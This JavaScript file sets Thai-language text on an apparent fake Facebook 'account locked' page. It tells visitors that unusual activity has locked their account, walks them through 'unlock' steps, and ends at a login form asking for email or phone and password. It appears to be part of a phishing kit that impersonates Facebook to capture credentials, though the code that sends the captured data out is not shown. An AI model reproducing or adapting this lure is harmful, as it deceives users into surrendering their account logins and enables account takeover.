var mainHeader = document.querySelector(".home-main-header .home-heading");
var mainParagraph = document.querySelector(".home-mainparagrph .home-text");
var lockedHeader = document.querySelector(".home-lockedheader .home-text1");
var lockedParagraph = document.querySelector(".home-lockedinfobox .home-container6 .home-text5");
var footerParagraph = document.querySelector(".home-main-card .home-container7 .home-text6");
var getStarted = document.querySelector(".home-main-card .home-link");
var nextHeader = document.querySelector(".home-next-card .home-unlock-header .home-text");
var fristLineHeader = document.querySelector(".home-f-line .home-text03");
var fristLineParagraph = document.querySelector(".home-f-line .home-text05 span"); 
var secoundLineHeader = document.querySelector(".home-s-line .home-text09"); 
var thirdLineHeader = document.querySelector(".home-t-line .home-text12"); 
var nextButton = document.querySelector(".home-next-buttons .home-button1");
var backButton = document.querySelector(".home-next-buttons .home-button");
var logHeading = document.querySelector(".home-log-card .dlog .home-heading");
var logAlert = document.querySelector(".home-log-card .home-alert");
var logAlert2 = document.getElementById("alert");
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".home-submit"); 
var or = document.querySelector(".home-or");
var createButton = document.querySelector(".home-creat-new");

mainHeader.innerHTML ="บัญชีของคุณถูกล็อค";
mainParagraph.innerHTML ="เราเห็นกิจกรรมที่ผิดปกติในบัญชีของคุณ ซึ่งอาจหมายความว่ามีคนใช้บัญชีของคุณโดยที่คุณไม่รู้";
lockedHeader.innerHTML ="บัญชีถูกล็อค 10 พฤศจิกายน 2021";
lockedParagraph.innerHTML ="เพื่อปกป้องคุณ โปรไฟล์ของคุณจะไม่ปรากฏต่อผู้คนบน Facebook และคุณไม่สามารถใช้บัญชีของคุณได้";
footerParagraph.innerHTML ="เราจะนำคุณผ่านขั้นตอนบางอย่างเพื่อปลดล็อกบัญชีของคุณ";
getStarted.innerHTML ="เริ่ม";
nextHeader.innerHTML ="วิธีปลดล็อกบัญชีของคุณ";
fristLineHeader.innerHTML ="ยืนยันว่านี่คือบัญชีของคุณ";
fristLineParagraph.innerHTML ="เนื่องจากอาจมีคนอื่นเข้าถึงได้ เราจึงต้องยืนยันว่าคุณเป็นเจ้าของบัญชีนี้ก่อนที่เราจะดำเนินการต่อ";
secoundLineHeader.innerHTML ="รักษาความปลอดภัยรายละเอียดการเข้าสู่ระบบของคุณ";
thirdLineHeader.innerHTML ="บัญชีของคุณจะถูกปลดล็อค";
nextButton.innerHTML ="ต่อไป";
backButton.innerHTML ="กลับ";
logHeading.innerHTML ="เข้าสู่ระบบ Facebook";
logAlert.innerHTML ="คุณต้องเข้าสู่ระบบก่อน";
logAlert2.innerHTML ="คุณต้องเข้าสู่ระบบก่อน";
userInput.setAttribute("placeholder" , "ที่อยู่อีเมลหรือหมายเลขโทรศัพท์");
passInput.setAttribute("placeholder" , "รหัสผ่าน");
logButton.innerHTML ="เข้าสู่ระบบ";
or.innerHTML ="หรือ";
createButton.innerHTML ="สร้างบัญชีใหม่";